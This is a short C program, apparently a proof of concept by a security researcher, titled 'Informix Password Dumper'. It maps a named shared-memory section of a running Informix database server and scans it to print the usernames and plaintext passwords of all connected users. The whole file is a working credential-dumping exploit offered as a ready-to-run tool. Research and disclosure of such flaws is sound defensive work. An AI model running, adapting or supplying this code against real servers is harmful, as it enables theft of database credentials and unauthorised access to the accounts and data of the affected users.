#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
int main( int argc, char * argv[] )
{
        HANDLE h;
        unsigned char *ptr;

        printf("\n\n\tInformix Password Dumper\n\n");
        if(argc !=2)
        {
                printf("\tUsage:\n\n\tC:\\>%s SECTION\n\n",argv[0]);
                printf("\te.g.\n\n\tC:\\>%s T1381386242\n\n",argv[0]);
                printf("\tThis utility uses MapViewOfFile to read a shared mem-ory section\n");
                printf("\tin the Informix server process and dumps the passwords of all\n");
                printf("\tconnected users.\n\n\tDavid Litch-field\n\t(davidl@ngssoftware.com)\n");
                printf("\t11th January 2004\n\n");
                return 0;
        }
        h = OpenFileMapping(FILE_MAP_READ, FALSE, argv[1]);
        if(!h)
                return printf("Couldn't open section %s\n",argv[1]);

        ptr = (unsigned char *)MapViewOfFile( h, FILE_MAP_READ, 0, 0, 0 );
        printf("The following users are connected:\n\n");
        __try
        {
                while( 1 )
                {
                        if(*ptr == ' ')
                        {
                                ptr ++;
                                if(*ptr == '-')
                                {
                                        ptr ++;
                                        if(*ptr == 'p')
                                        {
                                                ptr ++;
                                                dumppassword(ptr);
                                        }
                                }
                        }
                ptr++;
                }
        }
        __except( EXCEPTION_EXECUTE_HANDLER )
        {
        }
        return 0;
}

//      <SP>USERNAME<SP>-pPASSWORD<SP>
int dumppassword(unsigned char *fptr)
{
        unsigned char count = 0;
        unsigned char *ptr = NULL;
        ptr = fptr - 4;
        while(count < 255)
        {
                if(*ptr == 0x00)
                        return printf("Error\n");
                if(*ptr == 0x20)
                        break;
                ptr --;
                count ++;
        }
        count = 0;
        ptr ++;
        printf("Username: ");
        while(count < 1)
        {
                if(*ptr == 0x20)
                        break;
                printf("%c",*ptr);
                ptr ++;
        }
        count = 0;
        ptr = ptr + 3;
        printf("\t\tPassword: ");
        while(count < 1)
        {
                if(*ptr == 0x20)
                        break;
                printf("%c",*ptr);
                ptr ++;
        }
        count = 0;
        printf("\n");
        return 0;
}
